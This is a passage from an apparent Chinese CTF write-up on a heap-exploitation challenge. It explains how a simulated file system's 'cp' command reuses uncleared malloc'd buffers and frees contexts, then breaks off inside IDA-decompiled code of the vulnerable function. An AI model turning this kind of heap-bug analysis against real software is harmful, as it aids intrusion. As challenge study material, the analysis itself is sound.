&lt;p&gt;每次 echo，都会清空 context 的内容，而且是跟据 chunksize 清空的。并且如果写的数据大于等于 chunksize-2 就会把 context 调大。而且注意。&lt;/p&gt;
&lt;h4 id=&#34;cp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cp&#34;&gt;#&lt;/a&gt; cp&lt;/h4&gt;
&lt;p&gt;整个程序攻击的开始就是在 cp，cp 可以拷贝当前目录下的文件，一个是把他的内容拷贝到当前目录下的另一个文件里，起一个是拷贝到子文件夹下的文件里，如果指定的文件不存在，会自动创建。但是佟阿姨那个调用的是 calloc40，所以没有 uaf。问题在于对 context 的复制，目标文件没有 context 指针，会申请一个，重点来了，这里用的是 malloc，而且不会清空。如果我们要拷贝的文件没有 context，会把对应的目标文件的 context     free。或者直接创建一个新的空文件。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;77&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;78&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;79&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;81&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;82&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;83&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;84&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;85&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;86&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;87&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;88&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;89&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;90&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;91&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;92&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;93&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;94&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;95&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;96&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;98&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;100&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;106&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;107&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;111&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;112&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;113&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;116&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;117&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;118&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;119&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;120&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;121&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;122&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;123&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;124&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;125&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;126&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;127&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;128&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;129&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;130&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;131&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;132&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;133&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;134&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;135&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;136&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;137&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;138&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;139&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;140&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;141&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;142&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;143&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;144&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;145&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;146&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;147&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;148&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;149&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;150&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;151&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;152&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;153&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;154&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;155&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;156&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;157&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;158&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;159&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;160&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;161&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;162&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;163&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;164&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;165&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;166&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;167&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;169&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;170&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;171&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;172&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;174&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;175&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;176&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;181&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;182&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;183&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;184&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;185&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;186&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;187&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;188&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;189&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;190&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;191&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;193&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;194&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;195&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;196&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;197&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;198&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;199&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;200&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;201&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;202&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;203&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;204&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;205&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;206&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;207&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;208&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;209&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;210&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;211&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;212&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;213&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;214&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;215&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;216&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;217&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;218&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;219&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;220&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;221&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;222&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;223&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;224&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;225&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;226&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;227&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;228&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;229&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;__int64 __fastcall &lt;span class=&#34;title function_&#34;&gt;acp&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **cmd)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v1; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; *v2; &lt;span class=&#34;comment&#34;&gt;// rsp&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v4; &lt;span class=&#34;comment&#34;&gt;// rbx&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;size_t&lt;/span&gt; v5; &lt;span class=&#34;comment&#34;&gt;// rax&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v6[&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+8h] [rbp-B0h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; **comment; &lt;span class=&#34;comment&#34;&gt;// [rsp+20h] [rbp-98h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v8; &lt;span class=&#34;comment&#34;&gt;// [rsp+29h] [rbp-8Fh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v9; &lt;span class=&#34;comment&#34;&gt;// [rsp+2Ah] [rbp-8Eh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v10; &lt;span class=&#34;comment&#34;&gt;// [rsp+2Bh] [rbp-8Dh]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; i; &lt;span class=&#34;comment&#34;&gt;// [rsp+2Ch] [rbp-8Ch]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; nums; &lt;span class=&#34;comment&#34;&gt;// [rsp+30h] [rbp-88h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v13; &lt;span class=&#34;comment&#34;&gt;// [rsp+34h] [rbp-84h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;; &lt;span class=&#34;comment&#34;&gt;// [rsp+38h] [rbp-80h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *destination; &lt;span class=&#34;comment&#34;&gt;// [rsp+40h] [rbp-78h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *copied_file; &lt;span class=&#34;comment&#34;&gt;// [rsp+48h] [rbp-70h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *s1; &lt;span class=&#34;comment&#34;&gt;// [rsp+50h] [rbp-68h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *curops; &lt;span class=&#34;comment&#34;&gt;// [rsp+58h] [rbp-60h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *ptr; &lt;span class=&#34;comment&#34;&gt;// [rsp+60h] [rbp-58h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  __int64 v20; &lt;span class=&#34;comment&#34;&gt;// [rsp+68h] [rbp-50h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *dest; &lt;span class=&#34;comment&#34;&gt;// [rsp+70h] [rbp-48h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *curr; &lt;span class=&#34;comment&#34;&gt;// [rsp+78h] [rbp-40h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  file *temp; &lt;span class=&#34;comment&#34;&gt;// [rsp+80h] [rbp-38h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; delim[&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [rsp+8Eh] [rbp-2Ah] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int64 v25; &lt;span class=&#34;comment&#34;&gt;// [rsp+90h] [rbp-28h]&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  comment = cmd;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v25 = __readfsqword(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  i = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt; = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  curops = cuurr_pos;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  destination = cuurr_pos-&amp;gt;firstson;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  copied_file = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ptr = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v8 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v9 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;strcpy&lt;/span&gt;(delim, &lt;span class=&#34;string&#34;&gt;&amp;quot;/&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ++i;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( comment[i] );&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  nums = i - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v13 = &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(comment[i - &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v20 = v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; - &lt;span class=&#34;number&#34;&gt;1LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] = v13 + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v6[&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;] = &lt;span class=&#34;number&#34;&gt;0LL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v1 = &lt;span class=&#34;number&#34;&gt;16&lt;/span&gt; * ((v6[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] + &lt;span class=&#34;number&#34;&gt;15&lt;/span&gt;) / &lt;span class=&#34;number&#34;&gt;0x10&lt;/span&gt;uLL);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( v6 != (v6 - (v1 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFFFFFFFFFFFF000&lt;/span&gt;LL)) )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v2 = alloca(v1 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( (v1 &amp;amp; &lt;span class=&#34;number&#34;&gt;0xFFF&lt;/span&gt;) != &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    *(&amp;amp;v6[&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;] + (v1 &amp;amp; &lt;span 